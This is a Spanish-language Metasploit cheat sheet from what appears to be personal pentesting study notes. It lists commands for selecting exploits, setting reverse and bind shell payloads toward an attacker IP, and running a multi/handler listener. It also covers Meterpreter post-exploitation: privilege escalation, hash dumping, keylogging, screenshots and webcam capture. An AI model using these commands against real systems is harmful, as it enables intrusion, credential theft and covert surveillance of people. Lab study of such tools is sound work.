# Metasploit — Cheat Sheet

> Framework de explotación, Meterpreter, post-explotación.

---

## Inicio

```bash
msfconsole                       # Iniciar consola
msfconsole -q                    # Modo silencioso
msfconsole -r script.rc          # Ejecutar resource script
```

## Búsqueda

```bash
search <keyword>                 # Buscar módulos
search type:exploit platform:linux  # Búsqueda filtrada
info <module>                    # Info de un módulo
```

## Uso de módulos

```bash
use exploit/<path>               # Seleccionar módulo
set RHOSTS 10.10.10.x           # IP objetivo
set RPORT 80                    # Puerto objetivo
set LHOST 10.10.14.x            # IP del atacante
set LPORT 4444                  # Puerto del atacante
set PAYLOAD <payload>            # Seleccionar payload
show options                     # Ver opciones configuradas
exploit                          # Ejecutar
exploit -j                       # Ejecutar como job en background
```

## Payloads

```bash
# Reverse shells
set PAYLOAD linux/x86/shell/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD php/meterpreter/reverse_tcp

# Bind shells
set PAYLOAD windows/shell/bind_tcp

# Meterpreter
set PAYLOAD windows/meterpreter/reverse_tcp
```

## Meterpreter

```bash
sysinfo                          # Info del sistema
getuid                           # Usuario actual
getsystem                        # Escalada a SYSTEM
hashdump                         # Dump de hashes
download <file>                  # Descargar archivo
upload <file>                    # Subir archivo
shell                            # Shell del sistema
execute -f cmd.exe -i -H         # Ejecutar processo
keyscan_start                    # Iniciar keylogger
keyscan_dump                     # Dump del keylogger
screenshot                       # Captura de pantalla
webcam_snap                      # Foto de webcam
```

## Post-explotación

```bash
use post/multi/recon/local_exploit_suggester  # Sugerir exploits
use post/linux/gather/hashdump               # Dump hashes Linux
use post/windows/gather/smart_hashdump       # Dump hashes Windows
use post/multi/manage/shell_to_meterpreter   # Shell a Meterpreter
```

## Fuzzing

```bash
use auxiliary/fuzzing/<module>    # Módulos de fuzzing
set SRVHOST 10.10.14.x
run
```

## Resource scripts

```bash
# Crear script.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.x
set LPORT 4444
exploit -j

# Ejecutar
msfconsole -r script.rc
```


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../08 - Metodologías/Metodología - Explotación Windows.md|Metodología - Explotación Windows]] — Escalada de Privilegios, Metasploit, Post-Explotación
- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]] — Escalada de Privilegios, Post-Explotación, Redes
- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Metasploit, Metodología Pentest, Post-Explotación
- [[../../apuntes evolve/BLOQUE 3.md|BLOQUE 3]] — Escalada de Privilegios, Post-Explotación, Redes
- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Metasploit, Metodología Pentest, Post-Explotación
- [[../../apuntes Chema/Wireshark.md|Wireshark]] — Metasploit, Post-Explotación, Redes

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]

> #escalada-privilegios #metasploit #pentest #post-explotacion #redes
